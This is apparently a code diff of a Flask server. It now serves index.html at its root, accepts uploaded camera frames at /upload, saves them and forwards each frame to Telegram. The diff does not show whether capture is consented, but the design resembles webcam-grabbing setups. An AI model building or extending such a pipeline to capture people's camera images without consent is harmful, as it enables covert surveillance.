@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
 import cv2
 import numpy as np
@@ -32,9 +32,10 @@ def send_to_telegram(filename):
 
 # ================================================
 
+# ✅ Yeh route ab index.html serve karega
 @app.route('/')
-def home():
-    return "✅ Server is running! Use /upload for camera."
+def index():
+    return send_from_directory('.', 'index.html')
 
 @app.route('/upload', methods=['POST', 'OPTIONS'])
 def upload_frame():
@@ -55,7 +56,6 @@ def upload_frame():
         filename = os.path.join(SAVE_DIR, f"frame_{timestamp}.jpg")
         cv2.imwrite(filename, frame)
 
-        # 🔥 Telegram par bhejo
         send_to_telegram(filename)
 
         return jsonify({"status": "saved", "file": filename}), 200
